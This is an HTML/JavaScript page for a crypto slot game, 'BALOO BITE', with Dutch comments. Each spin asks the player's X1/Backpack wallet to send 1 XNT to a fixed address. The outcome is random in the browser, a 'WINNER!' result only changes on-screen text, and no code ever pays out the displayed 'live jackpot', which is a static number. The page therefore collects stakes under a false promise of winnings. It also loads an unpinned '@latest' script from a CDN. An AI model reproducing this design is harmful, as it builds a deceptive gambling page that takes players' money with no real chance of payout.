<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BALOO BITE - V40 FINAL STABLE</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .game-card { background: #0a0a0a; border: 4px solid #ffd700; border-radius: 20px; padding: 25px; text-align: center; width: 350px; }
        .pot-container { background: #111; padding: 10px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #333; }
        .pot-value { font-size: 40px; color: #fff; font-weight: bold; }
        .slot-machine { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
        .reel { width: 80px; height: 100px; background: #1a1a1a; border-radius: 10px; border: 2px solid #333; display: flex; align-items: center; justify-content: center; font-size: 45px; overflow: hidden; }
        
        /* Simpele roll-animatie die de browser niet belast */
        .spinning { animation: roll 0.1s linear infinite; }
        @keyframes roll { 0% { transform: translateY(-10px); } 100% { transform: translateY(10px); } }

        .btn-bite { background: #ffd700; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 20px; border-radius: 10px; }
        .btn-bite:disabled { background: #555; cursor: not-allowed; }
        #status { font-size: 10px; color: #666; margin-top: 10px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="game-card">
        <div class="pot-container">
            <div style="font-size: 10px; color: #ffd700;">LIVE JACKPOT (XNT)</div>
            <div class="pot-value" id="potDisplay">100.00</div>
        </div>
        
        <div class="slot-machine">
            <div class="reel" id="re1">ðŸ¦´</div>
            <div class="reel" id="re2">ðŸ¦´</div>
            <div class="reel" id="re3">ðŸ¦´</div>
        </div>

        <button class="btn-bite" id="mainBtn" onclick="handleBite()">BITE THE BONE</button>
        <div id="status">READY FOR ACTION</div>
    </div>

    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script>
        let isFreeSpin = false;

        async function handleBite() {
            const btn = document.getElementById('mainBtn');
            const status = document.getElementById('status');
            const reels = [document.getElementById('re1'), document.getElementById('re2'), document.getElementById('re3')];
            const provider = window.x1 || window.backpack;

            if (!provider) return alert("Please install X1 Wallet!");

            // 1. Visuele start
            btn.disabled = true;
            reels.forEach(r => r.classList.add('spinning'));
            status.innerText = "PROCESSING...";

            try {
                // 2. Wallet-connectie (Alleen als geen free spin)
                if (!isFreeSpin) {
                    await provider.connect();
                    const tx = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: provider.publicKey,
                            toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
                            lamports: 1000000000 // 1 XNT
                        })
                    );
                    await provider.signAndSendTransaction(tx);
                }

                // 3. Stop de rollen met resultaat
                const items = ['ðŸ¦´', 'ðŸ¥ˆ', 'ðŸ¥‡'];
                const res = [
                    items[Math.floor(Math.random() * 3)],
                    items[Math.floor(Math.random() * 3)],
                    items[Math.floor(Math.random() * 3)]
                ];

                for (let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 600));
                    reels[i].classList.remove('spinning');
                    reels[i].innerText = res[i];
                }

                // 4. Winst-logica
                const golds = res.filter(x => x === 'ðŸ¥‡').length;
                if (golds === 3) { status.innerText = "WINNER!"; isFreeSpin = false; }
                else if (res[0] === res[1] || res[1] === res[2]) { 
                    status.innerText = "FREE SPIN!"; 
                    isFreeSpin = true; 
                    btn.innerText = "FREE BARK!";
                    btn.disabled = false;
                    return; 
                } else { status.innerText = "NO MATCH"; isFreeSpin = false; }

            } catch (e) {
                console.error(e);
                status.innerText = "ERROR - REFRESH";
                reels.forEach(r => r.classList.remove('spinning'));
                isFreeSpin = false;
            }

            // Cooldown van 30 seconden
            btn.innerText = "WAITING...";
            let cd = 30;
            const timer = setInterval(() => {
                btn.innerText = "WAIT " + cd + "S";
                if (cd-- <= 0) {
                    clearInterval(timer);
                    btn.disabled = false;
                    btn.innerText = "BITE THE BONE";
                    status.innerText = "READY";
                }
            }, 1000);
        }
    </script>
</body>
</html>
